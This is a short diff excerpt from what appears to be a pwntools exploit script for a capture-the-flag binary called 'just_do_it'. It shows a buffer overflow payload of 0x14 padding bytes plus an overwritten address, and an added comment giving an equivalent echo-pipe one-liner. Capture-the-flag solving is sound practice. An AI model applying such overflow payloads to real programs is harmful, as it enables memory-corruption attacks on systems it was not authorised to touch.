@@ -7,6 +7,9 @@ p.sendline(b'A'*0x14 + p32(0x0804a080))
 
 p.wait_for_close()
 
+# another way to solve:
+# echo -ne "aaaaaaaaaaaaaaaaaaaa\x80\xa0\x04\x08" | ./just_do_it
+
 
 """
 
